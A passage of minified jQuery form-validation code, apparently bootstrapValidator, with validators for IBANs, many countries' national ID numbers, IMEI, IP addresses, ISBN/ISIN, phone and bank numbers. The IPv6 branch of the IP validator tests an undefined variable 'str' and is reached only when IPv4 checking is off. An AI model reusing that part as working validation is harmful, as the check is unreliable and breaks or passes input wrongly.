                ME: "ME[0-9]{2}[0-9]{3}[0-9]{13}[0-9]{2}",
                MG: "MG[0-9]{2}[0-9]{23}",
                MK: "MK[0-9]{2}[0-9]{3}[A-Z0-9]{10}[0-9]{2}",
                ML: "ML[0-9]{2}[A-Z]{1}[0-9]{23}",
                MR: "MR13[0-9]{5}[0-9]{5}[0-9]{11}[0-9]{2}",
                MT: "MT[0-9]{2}[A-Z]{4}[0-9]{5}[A-Z0-9]{18}",
                MU: "MU[0-9]{2}[A-Z]{4}[0-9]{2}[0-9]{2}[0-9]{12}[0-9]{3}[A-Z]{3}",
                MZ: "MZ[0-9]{2}[0-9]{21}",
                NL: "NL[0-9]{2}[A-Z]{4}[0-9]{10}",
                NO: "NO[0-9]{2}[0-9]{4}[0-9]{6}[0-9]{1}",
                PK: "PK[0-9]{2}[A-Z]{4}[A-Z0-9]{16}",
                PL: "PL[0-9]{2}[0-9]{8}[0-9]{16}",
                PS: "PS[0-9]{2}[A-Z]{4}[A-Z0-9]{21}",
                PT: "PT[0-9]{2}[0-9]{4}[0-9]{4}[0-9]{11}[0-9]{2}",
                QA: "QA[0-9]{2}[A-Z]{4}[A-Z0-9]{21}",
                RO: "RO[0-9]{2}[A-Z]{4}[A-Z0-9]{16}",
                RS: "RS[0-9]{2}[0-9]{3}[0-9]{13}[0-9]{2}",
                SA: "SA[0-9]{2}[0-9]{2}[A-Z0-9]{18}",
                SE: "SE[0-9]{2}[0-9]{3}[0-9]{16}[0-9]{1}",
                SI: "SI[0-9]{2}[0-9]{5}[0-9]{8}[0-9]{2}",
                SK: "SK[0-9]{2}[0-9]{4}[0-9]{6}[0-9]{10}",
                SM: "SM[0-9]{2}[A-Z]{1}[0-9]{5}[0-9]{5}[A-Z0-9]{12}",
                SN: "SN[0-9]{2}[A-Z]{1}[0-9]{23}",
                TN: "TN59[0-9]{2}[0-9]{3}[0-9]{13}[0-9]{2}",
                TR: "TR[0-9]{2}[0-9]{5}[A-Z0-9]{1}[A-Z0-9]{16}",
                VG: "VG[0-9]{2}[A-Z]{4}[0-9]{16}"
            };
            e = e.replace(/[^a-zA-Z0-9]/g, "").toUpperCase();
            var g = d.country || e.substr(0, 2);
            if (!f[g])
                return !1;
            if (!new RegExp("^" + f[g] + "$").test(e))
                return !1;
            e = e.substr(4) + e.substr(0, 4),
            e = a.map(e.split(""), function(a) {
                var b = a.charCodeAt(0);
                return b >= "A".charCodeAt(0) && b <= "Z".charCodeAt(0) ? b - "A".charCodeAt(0) + 10 : a
            }),
            e = e.join("");
            for (var h = parseInt(e.substr(0, 1), 10), i = e.length, j = 1; i > j; ++j)
                h = (10 * h + parseInt(e.substr(j, 1), 10)) % 97;
            return 1 == h
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.id = {
        html5Attributes: {
            message: "message",
            country: "country"
        },
        validate: function(a, b, c) {
            var d = b.val();
            if ("" == d)
                return !0;
            var e = c.country || d.substr(0, 2)
              , f = ["_", e.toLowerCase()].join("");
            return this[f] && "function" == typeof this[f] ? this[f](d) : !0
        },
        _validateJMBG: function(a, b) {
            if (!/^\d{13}$/.test(a))
                return !1;
            var c = parseInt(a.substr(0, 2), 10)
              , d = parseInt(a.substr(2, 2), 10)
              , e = (parseInt(a.substr(4, 3), 10),
            parseInt(a.substr(7, 2), 10))
              , f = parseInt(a.substr(12, 1), 10);
            if (c > 31 || d > 12)
                return !1;
            for (var g = 0, h = 0; 6 > h; h++)
                g += (7 - h) * (parseInt(a.charAt(h)) + parseInt(a.charAt(h + 6)));
            if (g = 11 - g % 11,
            (10 == g || 11 == g) && (g = 0),
            g != f)
                return !1;
            switch (b.toUpperCase()) {
            case "BA":
                return e >= 10 && 19 >= e;
            case "MK":
                return e >= 41 && 49 >= e;
            case "ME":
                return e >= 20 && 29 >= e;
            case "RS":
                return e >= 70 && 99 >= e;
            case "SI":
                return e >= 50 && 59 >= e;
            default:
                return !0
            }
        },
        _ba: function(a) {
            return this._validateJMBG(a, "BA")
        },
        _mk: function(a) {
            return this._validateJMBG(a, "MK")
        },
        _me: function(a) {
            return this._validateJMBG(a, "ME")
        },
        _rs: function(a) {
            return this._validateJMBG(a, "RS")
        },
        _si: function(a) {
            return this._validateJMBG(a, "SI")
        },
        _bg: function(b) {
            if (!/^\d{10}$/.test(b) && !/^\d{6}\s\d{3}\s\d{1}$/.test(b))
                return !1;
            b = b.replace(/\s/g, "");
            var c = parseInt(b.substr(0, 2), 10) + 1900
              , d = parseInt(b.substr(2, 2), 10)
              , e = parseInt(b.substr(4, 2), 10);
            if (d > 40 ? (c += 100,
            d -= 40) : d > 20 && (c -= 100,
            d -= 20),
            !a.fn.bootstrapValidator.helpers.date(c, d, e))
                return !1;
            for (var f = 0, g = [2, 4, 8, 5, 10, 9, 7, 3, 6], h = 0; 9 > h; h++)
                f += parseInt(b.charAt(h)) * g[h];
            return f = f % 11 % 10,
            f == b.substr(9, 1)
        },
        _br: function(a) {
            if (/^1{11}|2{11}|3{11}|4{11}|5{11}|6{11}|7{11}|8{11}|9{11}|0{11}$/.test(a))
                return !1;
            if (!/^\d{11}$/.test(a) && !/^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(a))
                return !1;
            a = a.replace(/\./g, "").replace(/-/g, "");
            for (var b = 0, c = 0; 9 > c; c++)
                b += (10 - c) * parseInt(a.charAt(c));
            if (b = 11 - b % 11,
            (10 == b || 11 == b) && (b = 0),
            b != a.charAt(9))
                return !1;
            var d = 0;
            for (c = 0; 10 > c; c++)
                d += (11 - c) * parseInt(a.charAt(c));
            return d = 11 - d % 11,
            (10 == d || 11 == d) && (d = 0),
            d == a.charAt(10)
        },
        _ch: function(a) {
            if (!/^756[\.]{0,1}[0-9]{4}[\.]{0,1}[0-9]{4}[\.]{0,1}[0-9]{2}$/.test(a))
                return !1;
            a = a.replace(/\D/g, "").substr(3);
            for (var b = a.length, c = 0, d = 8 == b ? [3, 1] : [1, 3], e = 0; b - 1 > e; e++)
                c += parseInt(a.charAt(e)) * d[e % 2];
            return c = 10 - c % 10,
            c == a.charAt(b - 1)
        },
        _cl: function(a) {
            if (!/^\d{7,8}[-]{0,1}[0-9K]$/.test(a))
                return !1;
            for (a = a.replace(/\D/g, ""); a.length < 9; )
                a = "0" + a;
            for (var b = 0, c = [3, 2, 7, 6, 5, 4, 3, 2], d = 0; 8 > d; d++)
                b += parseInt(a.charAt(d)) * c[d];
            return b = 11 - b % 11,
            11 == b ? b = 0 : 10 == b && (b = "K"),
            b == a.charAt(8)
        },
        _cz: function(b) {
            if (!/^\d{9,10}$/.test(b))
                return !1;
            var c = 1900 + parseInt(b.substr(0, 2))
              , d = parseInt(b.substr(2, 2)) % 50 % 20
              , e = parseInt(b.substr(4, 2));
            if (9 == b.length) {
                if (c >= 1980 && (c -= 100),
                c > 1953)
                    return !1
            } else
                1954 > c && (c += 100);
            if (!a.fn.bootstrapValidator.helpers.date(c, d, e))
                return !1;
            if (10 == b.length) {
                var f = parseInt(b.substr(0, 9), 10) % 11;
                return 1985 > c && (f %= 10),
                f == b.substr(9, 1)
            }
            return !0
        },
        _dk: function(b) {
            if (!/^[0-9]{6}[-]{0,1}[0-9]{4}$/.test(b))
                return !1;
            b = b.replace(/-/g, "");
            var c = parseInt(b.substr(0, 2), 10)
              , d = parseInt(b.substr(2, 2), 10)
              , e = parseInt(b.substr(4, 2), 10);
            switch (!0) {
            case -1 != "5678".indexOf(b.charAt(6)) && e >= 58:
                e += 1800;
                break;
            case -1 != "0123".indexOf(b.charAt(6)):
            case -1 != "49".indexOf(b.charAt(6)) && e >= 37:
                e += 1900;
                break;
            default:
                e += 2e3
            }
            return a.fn.bootstrapValidator.helpers.date(e, d, c)
        },
        _ee: function(a) {
            return this._lt(a)
        },
        _es: function(a) {
            if (!/^[0-9A-Z]{8}[-]{0,1}[0-9A-Z]$/.test(a) && !/^[XYZ][-]{0,1}[0-9]{7}[-]{0,1}[0-9A-Z]$/.test(a))
                return !1;
            a = a.replace(/-/g, "");
            var b = "XYZ".indexOf(a.charAt(0));
            -1 != b && (a = b + a.substr(1) + "");
            var c = parseInt(a.substr(0, 8), 10);
            return c = "TRWAGMYFPDXBNJZSQVHLCKE"[c % 23],
            c == a.substr(8, 1)
        },
        _fi: function(b) {
            if (!/^[0-9]{6}[-+A][0-9]{3}[0-9ABCDEFHJKLMNPRSTUVWXY]$/.test(b))
                return !1;
            var c = parseInt(b.substr(0, 2), 10)
              , d = parseInt(b.substr(2, 2), 10)
              , e = parseInt(b.substr(4, 2), 10)
              , f = {
                "+": 1800,
                "-": 1900,
                A: 2e3
            };
            if (e = f[b.charAt(6)] + e,
            !a.fn.bootstrapValidator.helpers.date(e, d, c))
                return !1;
            var g = parseInt(b.substr(7, 3));
            if (2 > g)
                return !1;
            var h = b.substr(0, 6) + b.substr(7, 3) + "";
            return h = parseInt(h),
            "0123456789ABCDEFHJKLMNPRSTUVWXY".charAt(h % 31) == b.charAt(10)
        },
        _hr: function(b) {
            return /^[0-9]{11}$/.test(b) ? a.fn.bootstrapValidator.helpers.mod_11_10(b) : !1
        },
        _ie: function(a) {
            if (!/^\d{7}[A-W][AHWTX]?$/.test(a))
                return !1;
            var b = function(a) {
                for (; a.length < 7; )
                    a = "0" + a;
                for (var b = "WABCDEFGHIJKLMNOPQRSTUV", c = 0, d = 0; 7 > d; d++)
                    c += parseInt(a.charAt(d)) * (8 - d);
                return c += 9 * b.indexOf(a.substr(7)),
                b[c % 23]
            };
            return 9 != a.length || "A" != a.charAt(8) && "H" != a.charAt(8) ? a.charAt(7) == b(a.substr(0, 7)) : a.charAt(7) == b(a.substr(0, 7) + a.substr(8) + "")
        },
        _is: function(b) {
            if (!/^[0-9]{6}[-]{0,1}[0-9]{4}$/.test(b))
                return !1;
            b = b.replace(/-/g, "");
            var c = parseInt(b.substr(0, 2), 10)
              , d = parseInt(b.substr(2, 2), 10)
              , e = parseInt(b.substr(4, 2), 10)
              , f = parseInt(b.charAt(9));
            if (e = 9 == f ? 1900 + e : 100 * (20 + f) + e,
            !a.fn.bootstrapValidator.helpers.date(e, d, c, !0))
                return !1;
            for (var g = 0, h = [3, 2, 7, 6, 5, 4, 3, 2], i = 0; 8 > i; i++)
                g += parseInt(b.charAt(i)) * h[i];
            return g = 11 - g % 11,
            g == b.charAt(8)
        },
        _lt: function(b) {
            if (!/^[0-9]{11}$/.test(b))
                return !1;
            var c = parseInt(b.charAt(0))
              , d = parseInt(b.substr(1, 2), 10)
              , e = parseInt(b.substr(3, 2), 10)
              , f = parseInt(b.substr(5, 2), 10)
              , g = c % 2 == 0 ? 17 + c / 2 : 17 + (c + 1) / 2;
            if (d = 100 * g + d,
            !a.fn.bootstrapValidator.helpers.date(d, e, f, !0))
                return !1;
            for (var h = 0, i = [1, 2, 3, 4, 5, 6, 7, 8, 9, 1], j = 0; 10 > j; j++)
                h += parseInt(b.charAt(j)) * i[j];
            if (h %= 11,
            10 != h)
                return h == b.charAt(10);
            for (h = 0,
            i = [3, 4, 5, 6, 7, 8, 9, 1, 2, 3],
            j = 0; 10 > j; j++)
                h += parseInt(b.charAt(j)) * i[j];
            return h %= 11,
            10 == h && (h = 0),
            h == b.charAt(10)
        },
        _lv: function(b) {
            if (!/^[0-9]{6}[-]{0,1}[0-9]{5}$/.test(b))
                return !1;
            b = b.replace(/\D/g, "");
            var c = parseInt(b.substr(0, 2))
              , d = parseInt(b.substr(2, 2))
              , e = parseInt(b.substr(4, 2));
            if (e = e + 1800 + 100 * parseInt(b.charAt(6)),
            !a.fn.bootstrapValidator.helpers.date(e, d, c, !0))
                return !1;
            for (var f = 0, g = [10, 5, 8, 4, 2, 1, 6, 3, 7, 9], h = 0; 10 > h; h++)
                f += parseInt(b.charAt(h)) * g[h];
            return f = (f + 1) % 11 % 10,
            f == b.charAt(10)
        },
        _nl: function(a) {
            for (; a.length < 9; )
                a = "0" + a;
            if (!/^[0-9]{4}[.]{0,1}[0-9]{2}[.]{0,1}[0-9]{3}$/.test(a))
                return !1;
            if (a = a.replace(/\./g, ""),
            0 == parseInt(a, 10))
                return !1;
            for (var b = 0, c = a.length, d = 0; c - 1 > d; d++)
                b += (9 - d) * parseInt(a.charAt(d));
            return b %= 11,
            10 == b && (b = 0),
            b == a.charAt(c - 1)
        },
        _ro: function(b) {
            if (!/^[0-9]{13}$/.test(b))
                return !1;
            var c = parseInt(b.charAt(0));
            if (0 == c || 7 == c || 8 == c)
                return !1;
            var d = parseInt(b.substr(1, 2), 10)
              , e = parseInt(b.substr(3, 2), 10)
              , f = parseInt(b.substr(5, 2), 10)
              , g = {
                1: 1900,
                2: 1900,
                3: 1800,
                4: 1800,
                5: 2e3,
                6: 2e3
            };
            if (f > 31 && e > 12)
                return !1;
            if (9 != c && (d = g[c + ""] + d,
            !a.fn.bootstrapValidator.helpers.date(d, e, f)))
                return !1;
            for (var h = 0, i = [2, 7, 9, 1, 4, 6, 3, 5, 8, 2, 7, 9], j = b.length, k = 0; j - 1 > k; k++)
                h += parseInt(b.charAt(k)) * i[k];
            return h %= 11,
            10 == h && (h = 1),
            h == b.charAt(j - 1)
        },
        _se: function(b) {
            if (!/^[0-9]{10}$/.test(b) && !/^[0-9]{6}[-|+][0-9]{4}$/.test(b))
                return !1;
            b = b.replace(/[^0-9]/g, "");
            var c = parseInt(b.substr(0, 2)) + 1900
              , d = parseInt(b.substr(2, 2))
              , e = parseInt(b.substr(4, 2));
            return a.fn.bootstrapValidator.helpers.date(c, d, e) ? a.fn.bootstrapValidator.helpers.luhn(b) : !1
        },
        _sk: function(a) {
            return this._cz(a)
        },
        _sm: function(a) {
            return /^\d{5}$/.test(a)
        },
        _za: function(b) {
            if (!/^[0-9]{10}[0|1][8|9][0-9]$/.test(b))
                return !1;
            var c = parseInt(b.substr(0, 2))
              , d = (new Date).getFullYear() % 100
              , e = parseInt(b.substr(2, 2))
              , f = parseInt(b.substr(4, 2));
            return c = c >= d ? c + 1900 : c + 2e3,
            a.fn.bootstrapValidator.helpers.date(c, e, f) ? a.fn.bootstrapValidator.helpers.luhn(b) : !1
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.identical = {
        html5Attributes: {
            message: "message",
            field: "field"
        },
        validate: function(a, b, c) {
            var d = b.val();
            if ("" == d)
                return !0;
            var e = a.getFieldElements(c.field);
            return null == e ? !0 : d == e.val() ? (a.updateStatus(c.field, a.STATUS_VALID, "identical"),
            !0) : !1
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.imei = {
        validate: function(b, c) {
            var d = c.val();
            if ("" == d)
                return !0;
            switch (!0) {
            case /^\d{15}$/.test(d):
            case /^\d{2}-\d{6}-\d{6}-\d{1}$/.test(d):
            case /^\d{2}\s\d{6}\s\d{6}\s\d{1}$/.test(d):
                return d = d.replace(/[^0-9]/g, ""),
                a.fn.bootstrapValidator.helpers.luhn(d);
            case /^\d{14}$/.test(d):
            case /^\d{16}$/.test(d):
            case /^\d{2}-\d{6}-\d{6}(|-\d{2})$/.test(d):
            case /^\d{2}\s\d{6}\s\d{6}(|\s\d{2})$/.test(d):
                return !0;
            default:
                return !1
            }
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.integer = {
        enableByHtml5: function(a) {
            return "number" == a.attr("type")
        },
        validate: function(a, b) {
            var c = b.val();
            return "" == c ? !0 : /^(?:-?(?:0|[1-9][0-9]*))$/.test(c)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.ip = {
        html5Attributes: {
            message: "message",
            ipv4: "ipv4",
            ipv6: "ipv6"
        },
        validate: function(b, c, d) {
            var e = c.val();
            return "" == e ? !0 : (d = a.extend({}, {
                ipv4: !0,
                ipv6: !0
            }, d),
            d.ipv4 ? /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(e) : d.ipv6 ? /^\s*((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:)))(%.+)?\s*$/.test(str) : !1)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.isbn = {
        validate: function(a, b) {
            var c = b.val();
            if ("" == c)
                return !0;
            var d;
            switch (!0) {
            case /^\d{9}[\dX]$/.test(c):
            case 13 == c.length && /^(\d+)-(\d+)-(\d+)-([\dX])$/.test(c):
            case 13 == c.length && /^(\d+)\s(\d+)\s(\d+)\s([\dX])$/.test(c):
                d = "ISBN10";
                break;
            case /^(978|979)\d{9}[\dX]$/.test(c):
            case 17 == c.length && /^(978|979)-(\d+)-(\d+)-(\d+)-([\dX])$/.test(c):
            case 17 == c.length && /^(978|979)\s(\d+)\s(\d+)\s(\d+)\s([\dX])$/.test(c):
                d = "ISBN13";
                break;
            default:
                return !1
            }
            c = c.replace(/[^0-9X]/gi, "");
            var e, f = c.split(""), g = f.length, h = 0;
            switch (d) {
            case "ISBN10":
                h = 0;
                for (var i = 0; g - 1 > i; i++)
                    h += (10 - i) * parseInt(f[i]);
                return e = 11 - h % 11,
                11 == e ? e = 0 : 10 == e && (e = "X"),
                e + "" == f[g - 1];
            case "ISBN13":
                h = 0;
                for (var i = 0; g - 1 > i; i++)
                    h += i % 2 == 0 ? parseInt(f[i]) : 3 * parseInt(f[i]);
                return e = 10 - h % 10,
                10 == e && (e = "0"),
                e + "" == f[g - 1];
            default:
                return !1
            }
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.isin = {
        COUNTRY_CODES: "AF|AX|AL|DZ|AS|AD|AO|AI|AQ|AG|AR|AM|AW|AU|AT|AZ|BS|BH|BD|BB|BY|BE|BZ|BJ|BM|BT|BO|BQ|BA|BW|BV|BR|IO|BN|BG|BF|BI|KH|CM|CA|CV|KY|CF|TD|CL|CN|CX|CC|CO|KM|CG|CD|CK|CR|CI|HR|CU|CW|CY|CZ|DK|DJ|DM|DO|EC|EG|SV|GQ|ER|EE|ET|FK|FO|FJ|FI|FR|GF|PF|TF|GA|GM|GE|DE|GH|GI|GR|GL|GD|GP|GU|GT|GG|GN|GW|GY|HT|HM|VA|HN|HK|HU|IS|IN|ID|IR|IQ|IE|IM|IL|IT|JM|JP|JE|JO|KZ|KE|KI|KP|KR|KW|KG|LA|LV|LB|LS|LR|LY|LI|LT|LU|MO|MK|MG|MW|MY|MV|ML|MT|MH|MQ|MR|MU|YT|MX|FM|MD|MC|MN|ME|MS|MA|MZ|MM|NA|NR|NP|NL|NC|NZ|NI|NE|NG|NU|NF|MP|NO|OM|PK|PW|PS|PA|PG|PY|PE|PH|PN|PL|PT|PR|QA|RE|RO|RU|RW|BL|SH|KN|LC|MF|PM|VC|WS|SM|ST|SA|SN|RS|SC|SL|SG|SX|SK|SI|SB|SO|ZA|GS|SS|ES|LK|SD|SR|SJ|SZ|SE|CH|SY|TW|TJ|TZ|TH|TL|TG|TK|TO|TT|TN|TR|TM|TC|TV|UG|UA|AE|GB|US|UM|UY|UZ|VU|VE|VN|VG|VI|WF|EH|YE|ZM|ZW",
        validate: function(a, b) {
            var c = b.val();
            if ("" == c)
                return !0;
            c = c.toUpperCase();
            var d = new RegExp("^(" + this.COUNTRY_CODES + ")[0-9A-Z]{10}$");
            if (!d.test(c))
                return !1;
            for (var e = "", f = c.length, g = 0; f - 1 > g; g++) {
                var h = c.charCodeAt(g);
                e += h > 57 ? (h - 55).toString() : c.charAt(g)
            }
            var i = ""
              , j = e.length
              , k = j % 2 != 0 ? 0 : 1;
            for (g = 0; j > g; g++)
                i += parseInt(e[g]) * (g % 2 == k ? 2 : 1) + "";
            var l = 0;
            for (g = 0; g < i.length; g++)
                l += parseInt(i.charAt(g));
            return l = (10 - l % 10) % 10,
            l == c.charAt(f - 1)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.ismn = {
        validate: function(a, b) {
            var c = b.val();
            if ("" == c)
                return !0;
            var d;
            switch (!0) {
            case /^M\d{9}$/.test(c):
            case /^M-\d{4}-\d{4}-\d{1}$/.test(c):
            case /^M\s\d{4}\s\d{4}\s\d{1}$/.test(c):
                d = "ISMN10";
                break;
            case /^9790\d{9}$/.test(c):
            case /^979-0-\d{4}-\d{4}-\d{1}$/.test(c):
            case /^979\s0\s\d{4}\s\d{4}\s\d{1}$/.test(c):
                d = "ISMN13";
                break;
            default:
                return !1
            }
            "ISMN10" == d && (c = "9790" + c.substr(1)),
            c = c.replace(/[^0-9]/gi, "");
            for (var e = c.length, f = 0, g = [1, 3], h = 0; e - 1 > h; h++)
                f += parseInt(c.charAt(h)) * g[h % 2];
            return f = 10 - f % 10,
            f == c.charAt(e - 1)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.issn = {
        validate: function(a, b) {
            var c = b.val();
            if ("" == c)
                return !0;
            if (!/^\d{4}\-\d{3}[\dX]$/.test(c))
                return !1;
            c = c.replace(/[^0-9X]/gi, "");
            var d = c.split("")
              , e = d.length
              , f = 0;
            "X" == d[7] && (d[7] = 10);
            for (var g = 0; e > g; g++)
                f += (8 - g) * parseInt(d[g]);
            return f % 11 == 0
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.lessThan = {
        html5Attributes: {
            message: "message",
            value: "value",
            inclusive: "inclusive"
        },
        enableByHtml5: function(a) {
            var b = a.attr("max");
            return b ? {
                value: b
            } : !1
        },
        validate: function(a, b, c) {
            var d = b.val();
            return "" == d ? !0 : (d = parseFloat(d),
            c.inclusive === !0 || void 0 == c.inclusive ? d <= c.value : d < c.value)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.mac = {
        validate: function(a, b) {
            var c = b.val();
            return "" == c ? !0 : /^([0-9A-F]{2}[:-]){5}([0-9A-F]{2})$/.test(c)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.notEmpty = {
        enableByHtml5: function(a) {
            var b = a.attr("required") + "";
            return "required" == b || "true" == b
        },
        validate: function(b, c) {
            var d = c.attr("type");
            return "radio" == d || "checkbox" == d ? b.getFieldElements(c.attr("data-bv-field")).filter(":checked").length > 0 : "" != a.trim(c.val())
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.numeric = {
        html5Attributes: {
            message: "message",
            separator: "separator"
        },
        validate: function(a, b, c) {
            var d = b.val();
            if ("" == d)
                return !0;
            var e = c.separator || ".";
            return "." != e && (d = d.replace(e, ".")),
            !isNaN(parseFloat(d)) && isFinite(d)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.phone = {
        html5Attributes: {
            message: "message",
            country: "country"
        },
        validate: function(b, c, d) {
            var e = c.val();
            if ("" == e)
                return !0;
            var f = (d.country || "US").toUpperCase();
            switch (f) {
            case "GB":
                return e = a.trim(e),
                /^\(?(?:(?:0(?:0|11)\)?[\s-]?\(?|\+)44\)?[\s-]?\(?(?:0\)?[\s-]?\(?)?|0)(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}|\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4}|\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3})|\d{5}\)?[\s-]?\d{4,5}|8(?:00[\s-]?11[\s-]?11|45[\s-]?46[\s-]?4\d))(?:(?:[\s-]?(?:x|ext\.?\s?|\#)\d+)?)$/.test(e);
            case "US":
            default:
                return e = e.replace(/\D/g, ""),
                /^(?:(1\-?)|(\+1 ?))?\(?(\d{3})[\)\-\.]?(\d{3})[\-\.]?(\d{4})$/.test(e) && 10 == e.length
            }
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.regexp = {
        html5Attributes: {
            message: "message",
            regexp: "regexp"
        },
        enableByHtml5: function(a) {
            var b = a.attr("pattern");
            return b ? {
                regexp: b
            } : !1
        },
        validate: function(a, b, c) {
            var d = b.val();
            if ("" == d)
                return !0;
            var e = "string" == typeof c.regexp ? new RegExp(c.regexp) : c.regexp;
            return e.test(d)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.remote = {
        html5Attributes: {
            message: "message",
            url: "url",
            name: "name"
        },
        validate: function(b, c, d) {
            var e = c.val();
            if ("" == e)
                return !0;
            var f = c.attr("data-bv-field")
              , g = d.data;
            null == g && (g = {}),
            "function" == typeof g && (g = g.call(this, b)),
            g[d.name || f] = e;
            var h = new a.Deferred
              , i = a.ajax({
                type: "POST",
                url: d.url,
                dataType: "json",
                data: g
            });
            return i.then(function(a) {
                h.resolve(c, "remote", a.valid === !0 || "true" === a.valid, a.message ? a.message : null)
            }),
            h.fail(function() {
                i.abort()
            }),
            h
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.rtn = {
        validate: function(a, b) {
            var c = b.val();
            if ("" == c)
                return !0;
            if (!/^\d{9}$/.test(c))
                return !1;
            for (var d = 0, e = 0; e < c.length; e += 3)
                d += 3 * parseInt(c.charAt(e), 10) + 7 * parseInt(c.charAt(e + 1), 10) + parseInt(c.charAt(e + 2), 10);
            return 0 != d && d % 10 == 0
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.sedol = {
        validate: function(a, b) {
            var c = b.val();
            if ("" == c)
                return !0;
            if (c = c.toUpperCase(),
            !/^[0-9A-Z]{7}$/.test(c))
                return !1;
            for (var d = 0, e = [1, 3, 1, 7, 3, 9, 1], f = c.length, g = 0; f - 1 > g; g++)
                d += e[g] * parseInt(c.charAt(g), 36);
            return d = (10 - d % 10) % 10,
            d == c.charAt(f - 1)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.siren = {
        validate: function(b, c) {
            var d = c.val();
            return "" == d ? !0 : /^\d{9}$/.test(d) ? a.fn.bootstrapValidator.helpers.luhn(d) : !1
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.siret = {
        validate: function(a, b) {
            var c = b.val();
            if ("" == c)
                return !0;
            for (var d, e = 0, f = c.length, g = 0; f > g; g++)
                d = parseInt(c.charAt(g), 10),
                g % 2 == 0 && (d = 2 * d,
                d > 9 && (d -= 9)),
                e += d;
            return e % 10 == 0
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.step = {
        html5Attributes: {
            message: "message",
            base: "baseValue",
            step: "step"
        },
        validate: function(b, c, d) {
            var e = c.val();
            if ("" == e)
                return !0;
            if (d = a.extend({}, {
                baseValue: 0,
                step: 1
            }, d),
            e = parseFloat(e),
            isNaN(e) || !isFinite(e))
                return !1;
            var f = function(a, b) {
                var c = Math.pow(10, b);
                a *= c;
                var d = a > 0 | -(0 > a)
                  , e = a % 1 === .5 * d;
                return e ? (Math.floor(a) + (d > 0)) / c : Math.round(a) / c
            }
              , g = function(a, b) {
                if (0 == b)
                    return 1;
                var c = (a + "").split(".")
                  , d = (b + "").split(".")
                  , e = (1 == c.length ? 0 : c[1].length) + (1 == d.length ? 0 : d[1].length);
                return f(a - b * Math.floor(a / b), e)
            }
              , h = g(e - d.baseValue, d.step);
            return 0 == h || h == d.step
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.stringCase = {
        html5Attributes: {
            message: "message",
            "case": "case"
        },
        validate: function(a, b, c) {
            var d = b.val();
            if ("" == d)
                return !0;
            var e = (c["case"] || "lower").toLowerCase();
            switch (e) {
            case "upper":
                return d === d.toUpperCase();
            case "lower":
            default:
                return d === d.toLowerCase()
            }
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.stringLength = {
        html5Attributes: {
            message: "message",
            min: "min",
            max: "max"
        },
        enableByHtml5: function(a) {
            var b = a.attr("maxlength");
            return b ? {
                max: parseInt(b, 10)
            } : !1
        },
